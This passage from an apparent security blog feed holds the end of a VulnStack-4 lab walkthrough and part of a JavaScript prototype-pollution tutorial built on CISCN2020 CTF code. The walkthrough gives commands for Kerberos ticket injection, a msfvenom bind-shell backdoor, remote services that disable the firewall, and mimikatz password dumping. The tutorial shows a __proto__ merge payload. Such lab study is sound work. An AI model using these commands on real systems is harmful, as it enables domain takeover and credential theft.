-d 域控制器ip地址 -p 域成员密码</code></pre><p>成功生成票据文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134511406.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>mimikatz.exekerberos::purge               <span class="token comment"># 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>kerberos::list                <span class="token comment"># 查看当前机器凭证</span>kerberos::ptc TGT_douser@DEMO.com.ccache<span class="token punctuation">(</span>生成的票据文件<span class="token punctuation">)</span>   <span class="token comment"># 将票据注入到内存中</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134918464.png" alt loading="lazy"></p><p>尝试<code>net use</code>登录域控</p><pre class="language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135037745.png" alt loading="lazy"></p><p>如上图，成功登录域控并列出了域控的c盘目录。此时要想控制域控我们还要在Windows 7上面上传一个<strong>正向</strong>的msf马。</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/bind_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.108 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f exe -o bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135301027.png" alt loading="lazy"></p><p>传到Windows7上，然后用smb文件共享将msf马copy到域控的C盘</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/bind.exe</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135451397.png" alt loading="lazy"></p><p>通过远程在域控上面设置好计划任务</p><pre class="language-shell" data-language="shell"><code class="language-shell">schtasks /create /tn <span class="token string">"test"</span> /tr C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>bind.exe /sc MINUTE /S <span class="token number">192.168</span>.183.130</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135730932.png" alt loading="lazy"></p><p>显示<code>Access is denied</code>，用sc服务来远程执行，设置服务来关闭防火墙</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start unablefirewall</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140010708.png" alt loading="lazy"></p><p>创建服务执行msf马（msf正在监听）</p><pre class="language-shell" data-language="shell"><code class="language-shell">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create bindshell <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"c:<span class="token entity" title="\b">\b</span>ind.exe"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start bindshell</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140424925.png" alt loading="lazy"></p><p>msf配置</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140300413.png" alt loading="lazy"></p><p>成功上线域控</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140509486.png" alt loading="lazy"></p><p>上传mimikatz抓明文密码</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/Desktop/mimikatz.exe shellmimikatz.exeprivilege::debugsekurlsa::logonpasswords</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141108130.png" alt loading="lazy"></p><p>拿到域管理员密码为<code>Test2008@!</code></p><h3 id="寻找敏感文件"><a href="#寻找敏感文件" class="headerlink" title="寻找敏感文件"></a>寻找敏感文件</h3><p>拿下域控后，我们就要寻找开头说的那个域控中的重要文件了。开启域控的远程桌面</p><pre class="language-shell" data-language="shell"><code class="language-shell">run post/windows/manage/enable_rdp</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141301815.png" alt loading="lazy"></p><p>登录</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 rdesktop <span class="token number">192.168</span>.183.130输入账号密码，账号：DEMO<span class="token punctuation">\</span>Administrator 密码：Test2008@<span class="token operator">!</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103344426.png" alt loading="lazy"></p><p>传个everything</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103708452.png" alt loading="lazy"></p><p>安装后开启里面的http服务</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706104015740.png" alt loading="lazy"></p><p>kali浏览器走个代理，socks5的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105033678.png" alt loading="lazy"></p><p>随后即可访问服务器上的所有文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105540208.png" alt loading="lazy"></p><p>至于啥漂亮国攻击授权报告，靶机上没有这文件，估计是自己加上去的，但目的已达成，开溜~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文全程参考 &lt;a href=&quot;https://www.freebuf.com/articles/network/244704.html&quot;&gt;记一次Vulnstack靶场内网渗透（二）&lt;/a&gt; 来复现渗透过程，目的在于学习渗透流程和基本思路，记录下学习笔记&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://www.extrader.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="靶机" scheme="https://www.extrader.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="内网" scheme="https://www.extrader.top/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染漏洞学习</title>
    <link href="https://www.extrader.top/posts/45af3b18/"/>
    <id>https://www.extrader.top/posts/45af3b18/</id>
    <published>2021-06-05T09:17:35.000Z</published>
    <updated>2021-06-05T12:18:31.876Z</updated>
    
    <content type="html"><![CDATA[<p>学点新东西，JavaScript独有的安全问题，JavaScript原型链污染，记笔记</p><span id="more"></span><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>搬张图，转自：<a href="https://www.zhihu.com/question/34183746">https://www.zhihu.com/question/34183746</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605172359234.png" alt loading="lazy"></p><p>JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 <code>__proto__</code> ）指向它的构造函数的原型对象（<code>prototype</code> ）。该原型对象也有一个自己的原型对象( <code>__proto__</code> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><ul><li>原型：原型是Javascript中继承的基础,Javascript的继承就是基于原型的继承</li><li>原型链：原型链是javascript的实现的形式,递归继承原型对象的原型,原型链的顶端是Object的原型。</li></ul><h4 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h4><p>每个对象都有 <code>__proto__</code> 属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 <code>[[prototype]]</code>，但是 <code>[[prototype]]</code> 是内部属性，我们并不能访问到，所以使用 <code>__proto__</code> 来访问。</p><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>每个函数都有 prototype 属性，除了 <code>Function.prototype.bind()</code>，该属性指向原型。所有的类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</p><blockquote><p>遵循ECMAScript标准，<code>someObject.[[Prototype]]</code> 符号是用于指向 <code>someObject</code> 的原型。从 ECMAScript 6 开始，<code>[[Prototype]]</code> 可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf"><code>Object.getPrototypeOf()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a> 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <code>__proto__</code>。</p><p>但它不应该与构造函数 <code>func</code> 的 <code>prototype</code> 属性相混淆。被构造函数创建的实例对象的 <code>[[Prototype]]</code> 指向 <code>func</code> 的 <code>prototype</code> 属性。<strong><code>Object.prototype</code></strong> 属性表示 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的原型对象。</p></blockquote><h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 让我们从一个函数里创建一个对象o，它自身拥有属性a和b的：</span><span class="token keyword">let</span> <span class="token function-variable function">f</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 这么写也一样function f() &#123;  this.a = 1;  this.b = 2;&#125;*/</span><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;a: 1, b: 2&#125;</span><span class="token comment">// 在f函数的原型上定义属性</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">// 不要在 f 函数的原型上直接定义 f.prototype = &#123;b:3,c:4&#125;;这样会直接打破原型链</span><span class="token comment">// o.[[Prototype]] 有属性 b 和 c</span><span class="token comment">//  (其实就是 o.__proto__ 或者 o.constructor.prototype)</span><span class="token comment">// o.[[Prototype]].[[Prototype]] 是 Object.prototype.</span><span class="token comment">// 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null</span><span class="token comment">// 这就是原型链的末尾，即 null，</span><span class="token comment">// 根据定义，null 就是没有 [[Prototype]]。</span><span class="token comment">// 综上，整个原型链如下:</span><span class="token comment">// &#123;a:1, b:2&#125; ---> &#123;b:3, c:4&#125; ---> Object.prototype---> null</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span class="token comment">// a是o的自身属性吗？是的，该属性的值为 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span><span class="token comment">// b是o的自身属性吗？是的，该属性的值为 2</span><span class="token comment">// 原型上也有一个'b'属性，但是它不会被访问到。</span><span class="token comment">// 这种情况被称为"属性遮蔽 (property shadowing)"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span><span class="token comment">// c是o的自身属性吗？不是，那看看它的原型上有没有</span><span class="token comment">// c是o.[[Prototype]]的属性吗？是的，该属性的值为 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span class="token comment">// d 是 o 的自身属性吗？不是，那看看它的原型上有没有</span><span class="token comment">// d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有</span><span class="token comment">// o.[[Prototype]].[[Prototype]] 为 null，停止搜索</span><span class="token comment">// 找不到 d 属性，返回 undefined</span></code></pre><p>调用对象属性时, 会查找属性，如果本身没有，则会去<code>__proto__</code>中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有<code>__proto__</code>，那么会去<code>__proto__</code>的显式原型中查找，一直到null</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>这里采用P🐮的例子来简单分析一下</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// foo是一个简单的JavaScript对象</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>bar<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar 此时为1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 修改foo的原型（即Object）</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 此时再用Object创建一个空的zoo对象</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 查看zoo.bar</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605193352763.png" alt loading="lazy"></p><p>根据结果我们可以看到，<code>zoo.bar</code>打印出来的是2，foo是一个object实例，我们令<code>foo.__proto__.bar = 2</code>所以实际上是修改了<code>Object</code>这个类，增加了一个属性<code>bar</code>值为2，然后我们有创建了一个object类zoo，则zoo对象自然有一个bar属性</p><blockquote><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p></blockquote><h3 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h3><ol><li>常发生在<code>merge</code> 等对象递归合并操作</li><li>对象克隆</li><li>路径查找属性然后修改属性的时候</li></ol><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 1,2</span>o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 2</span></code></pre><p>这里为什么要用<code>JSON.parse</code>而不直接使用<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code></p><p>如果不使用<code>JSON.parse</code>，则原型链并不会被污染，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605195054300.png" alt loading="lazy"></p><p>因为我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2020-littlegame"><a href="#CISCN2020-littlegame" class="headerlink" title="CISCN2020 littlegame"></a>CISCN2020 littlegame</h4><p>2020年的国赛题，当时保存了一份题目源码，于是这里拿出来复现一下</p><p>index.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> setFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">COMMODITY</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sword"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token comment">// Times have changed</span>    <span class="token string">"gun"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"200"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">MOBS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Lv1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv3"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"15"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv4"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"30"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv5"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"65"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"Lv6"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"Bounty"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token constant">BOSS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Times have not changed</span>    <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token string">"201"</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"password1"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p1<span class="token punctuation">,</span>    <span class="token string">"password2"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p2<span class="token punctuation">,</span>    <span class="token string">"password3"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>p3<span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/BuyWeapon'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/EarnBounty'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/ChallengeBOSS'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"BOOS has said 'Times have not changed'!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/DeveloperControlPanel"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// not implement</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"What's your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Wrong password!Are you Admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/SpawnPoint'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>knight <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"HP"</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>        <span class="token string">"Gold"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token string">"Firepower"</span><span class="token operator">:</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Let's begin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/Privilege"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token 